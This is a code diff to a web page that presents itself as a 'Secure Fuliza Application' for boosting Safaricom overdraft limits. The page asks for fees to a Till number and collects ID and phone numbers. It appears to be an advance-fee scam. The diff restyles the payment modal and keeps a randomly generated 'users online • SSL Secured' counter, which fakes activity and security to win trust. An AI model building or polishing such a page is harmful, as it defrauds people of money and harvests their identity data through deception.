@@ -146,7 +146,7 @@ button{
 <div class="card hidden" id="limits">
   <h3>Select Your New Approved Limit</h3>
 
-  <div class="limits" id="limitList">
+  <div class="limits">
     <div class="box">Ksh 3,000<br>Fee: 250</div>
     <div class="box">Ksh 5,000<br>Fee: 293</div>
     <div class="box">Ksh 7,500<br>Fee: 350</div>
@@ -165,14 +165,14 @@ button{
   <button class="green" onclick="upgrade()">UPGRADE</button>
 </div>
 
-<!-- MODAL -->
+<!-- MODAL (UPDATED FINAL STEP) -->
 <div id="paymentModal" class="hidden" style="
 position:fixed;
 top:0;
 left:0;
 width:100%;
 height:100%;
-background:rgba(0,0,0,0.5);
+background:rgba(0,0,0,0.55);
 display:flex;
 align-items:center;
 justify-content:center;
@@ -180,41 +180,41 @@ z-index:999;
 ">
 
   <div style="
-    width:90%;
+    width:92%;
     max-width:360px;
-    background:#fff;
-    border-radius:20px;
+    background:#f9fafb;
+    border-radius:25px;
     overflow:hidden;
+    box-shadow:0 15px 40px rgba(0,0,0,0.2);
   ">
 
-    <div style="background:#16a34a;color:#fff;padding:20px;">
-      <small>SECURE FULIZA APPLICATION</small>
-      <h3 id="modalTitle"></h3>
+    <div style="background:#22c55e;color:#fff;padding:20px;">
+      <div style="font-size:12px;">SECURE FULIZA APPLICATION</div>
+      <div id="modalTitle" style="font-size:20px;font-weight:700;margin-top:5px;"></div>
     </div>
 
     <div style="padding:20px;">
 
       <div style="
-        background:#ecfdf5;
+        background:#d1fae5;
         padding:15px;
-        border-radius:12px;
+        border-radius:14px;
         font-size:14px;
-        margin-bottom:15px;
+        color:#065f46;
+        margin-bottom:18px;
       ">
-        Enter your Safaricom number for VERIFICATION!
-        Once payment to Till Number <b>6363781</b> is confirmed,
-        your boost request will begin processing.
+        Enter your Safaricom number for VERIFICATION! Once payment to Till Number <b>6363781</b> is confirmed, your boost request will begin processing.
       </div>
 
-      <input placeholder="ID Number">
-      <input id="modalPhone" placeholder="Phone Number">
+      <input placeholder="ID Number" style="background:#f3f4f6;border:none;">
+      <input id="modalPhone" style="background:#f3f4f6;border:none;">
 
-      <div style="display:flex;gap:10px;margin-top:15px;">
-        <button onclick="closeModal()" style="flex:1;background:#eee;">
+      <div style="display:flex;gap:12px;margin-top:18px;">
+        <button onclick="closeModal()" style="flex:1;background:#e5e7eb;color:#374151;">
           Cancel
         </button>
 
-        <button id="payBtn" style="flex:1;background:#16a34a;color:#fff;">
+        <button id="payBtn" style="flex:1;background:#22c55e;color:#fff;">
           Pay
         </button>
       </div>
@@ -228,7 +228,8 @@ z-index:999;
 // LIVE ACTIVITY
 setInterval(()=>{
   let num = Math.floor(Math.random()*200)+100;
-  liveActivity.innerText = num + " users online • SSL Secured";
+  document.getElementById("liveActivity").innerText =
+    num + " users online • SSL Secured";
 },2000);
 
 // FLOW
@@ -259,10 +260,10 @@ document.querySelectorAll(".box").forEach(box=>{
   };
 });
 
-// UPGRADE → SHOW MODAL
+// FINAL STEP (UPDATED)
 function upgrade(){
   let selected = document.querySelector(".box.active");
-  if(!selected) return alert("Select a limit");
+  if(!selected) return alert("Please select a limit");
 
   let text = selected.innerText;
   let amount = text.split("\n")[0];
@@ -274,7 +275,6 @@ function upgrade(){
   payBtn.innerText = "Pay Ksh " + fee;
 }
 
-// CLOSE MODAL
 function closeModal(){
   paymentModal.classList.add("hidden");
 }
